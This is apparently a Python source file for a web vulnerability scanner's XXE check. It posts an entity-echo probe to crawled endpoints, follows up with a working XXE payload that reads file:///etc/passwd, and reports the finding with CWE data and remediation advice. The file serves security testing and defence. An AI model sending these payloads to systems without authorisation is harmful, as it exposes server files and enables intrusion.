"""XXE (XML External Entity) detection for XML-accepting endpoints."""
from __future__ import annotations

import re

from webrecon.checks.base import Check
from webrecon.core.config import Config
from webrecon.core.crawler import CrawlData
from webrecon.core.http_client import HttpClient
from webrecon.core.target import Target
from webrecon.model.finding import Finding
from webrecon.model.severity import Severity


# An entity that expands to a marker (in-band echo) — no external fetch needed.
_XXE_ECHO = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE wr [<!ENTITY wrx "WRXXEMARKER1337">]>'
    '<root><data>&wrx;</data></root>'
)
# File-read attempt for endpoints that reflect parsed values.
_XXE_FILE = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE wr [<!ENTITY wrx SYSTEM "file:///etc/passwd">]>'
    '<root><data>&wrx;</data></root>'
)
_PASSWD_RE = re.compile(r"root:.*:0:0:")


class XxeCheck(Check):
    name = "xxe"
    description = "XML external entity injection on XML endpoints."

    def run(self, target: Target, http: HttpClient, crawl: CrawlData,
            config: Config) -> list[Finding]:
        findings: list[Finding] = []
        # Candidate endpoints: POST form actions + any URL that looks XML/API.
        candidates = {f.action for f in crawl.forms}
        candidates.add(target.url("/"))
        for url in crawl.urls:
            if any(h in url.lower() for h in ("xml", "api", "soap", "upload")):
                candidates.add(url)

        headers = {"Content-Type": "application/xml"}
        for idx, url in enumerate(sorted(candidates), start=1):
            echo = http.post(url, data=_XXE_ECHO, headers=headers)
            if echo is None:
                continue
            if "WRXXEMARKER1337" in (echo.text or ""):
                # Entity expansion works → try a file read for higher confidence.
                sev, conf, extra = Severity.HIGH, "PROBABLE", ""
                fr = http.post(url, data=_XXE_FILE, headers=headers)
                if fr is not None and _PASSWD_RE.search(fr.text or ""):
                    sev, conf, extra = Severity.CRITICAL, "CONFIRMED", \
                        "; /etc/passwd contents returned"
                findings.append(Finding(
                    id=f"XXE-{idx:03d}",
                    title="XML external entity (XXE) processing",
                    severity=sev, owasp="A05:2021 - Security Misconfiguration",
                    cwe="CWE-611", cvss=9.1 if sev == Severity.CRITICAL else 7.1,
                    location=url, confidence=conf,
                    description="The endpoint parses XML and expands custom "
                                "entities, indicating external entities may be "
                                "processed.",
                    evidence="entity expanded to injected marker" + extra,
                    impact="Local file disclosure, SSRF, and potential RCE.",
                    remediation="Disable DTD/external entity processing in the XML "
                                "parser (e.g. defusedxml, FEATURE_SECURE_PROCESSING).",
                    poc=f"curl -X POST -H 'Content-Type: application/xml' "
                        f"--data '<xxe payload>' '{url}'",
                    references=["https://cwe.mitre.org/data/definitions/611.html"]))
        return findings
